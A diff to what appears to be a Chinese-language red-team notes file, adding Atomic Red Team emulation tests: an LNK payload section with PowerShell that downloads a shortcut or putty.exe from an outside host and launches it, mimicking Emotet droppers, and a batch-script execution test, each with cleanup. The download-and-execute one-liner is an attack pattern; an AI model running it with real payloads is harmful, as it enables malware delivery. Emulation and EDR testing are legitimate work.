@@ -35,10 +35,12 @@
     - [Msxml2.ServerXmlHttp](#msxml2serverxmlhttp)
     - [Xml.XmlDocument](#xmlxmldocument)
     - [mshta](#mshta)
+    - [lnk Payload](#lnk-payload)
   - [编写与执行脚本](#编写与执行脚本)
     - [base64编码命令写入注册表然后读取解码并IEX执行](#base64编码命令写入注册表然后读取解码并iex执行)
     - [利用NTFS的ADS特性将脚本写入文件隐藏数据流](#利用ntfs的ads特性将脚本写入文件隐藏数据流)
   - [Office宏](#office宏)
+    - [创建于执行 Batch 脚本](#创建于执行-batch-脚本)
   - [域渗透](#域渗透)
     - [域内提权-42278/42287](#域内提权-4227842287)
 
@@ -1099,6 +1101,41 @@ C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https:/
 
 ---
 
+### lnk Payload
+
+> [(1) X 上的 Ankit Anubhav：“As we start the era of #Lnk #Emotet This is a simple POC lnk while which invokes powershell to download clean putty from my github and executes it. If this launches putty and no detect/block happens for your EDR, do investigate deeper if this can change https://t.co/Si4PyIvCVL https://t.co/xZZYSoKoKV” / X (twitter.com)](https://twitter.com/ankit_anubhav/status/1518932941090410496)
+>
+> AtomicRedTeam - T1204.002 - Atomic Test #10 - LNK Payload Download
+
+```powershell
+Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
+$file1 = "$env:Temp\test10.lnk"
+Start-Process $file1
+Start-Sleep -s 10
+taskkill /IM a.exe /F
+```
+
+![image-20231206225503915](http://cdn.ayusummer233.top/DailyNotes/202312062255290.png)
+
+```powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe
+```
+
+![image-20231206230226239](http://cdn.ayusummer233.top/DailyNotes/202312062302344.png)
+
+![image-20231206230234085](http://cdn.ayusummer233.top/DailyNotes/202312062302145.png)
+
+Cleanup:
+
+```powershell
+$file1 = "$env:Temp\test10.lnk"
+$file2 = "$env:Temp\a.exe"
+Remove-Item $file1 -ErrorAction Ignore
+Remove-Item $file2 -ErrorAction Ignore
+```
+
+---
+
 
 ## 编写与执行脚本
 
@@ -1196,6 +1233,24 @@ Invoke-MalDoc -macroCode $macrocode -officeProduct Word
 ![image-20231206142124746](http://cdn.ayusummer233.top/DailyNotes/202312061422421.png)
 
 ![image-20231206142200834](http://cdn.ayusummer233.top/DailyNotes/202312061422500.png)
+
+---
+
+### 创建于执行 Batch 脚本
+
+```powershell
+New-Item "C:\AtomicRedTeam\ExternalPayloads\T1059.003_script.bat" -Force | Out-Null
+Set-Content -Path "C:\AtomicRedTeam\ExternalPayloads\T1059.003_script.bat" -Value "dir"
+Start-Process "C:\AtomicRedTeam\ExternalPayloads\T1059.003_script.bat"
+```
+
+![image-20231206231252961](http://cdn.ayusummer233.top/DailyNotes/202312062312021.png)
+
+Cleanup:
+
+```powershell
+Remove-Item "C:\AtomicRedTeam\ExternalPayloads\T1059.003_script.bat" -Force -ErrorAction Ignore
+```
 
 ---
 
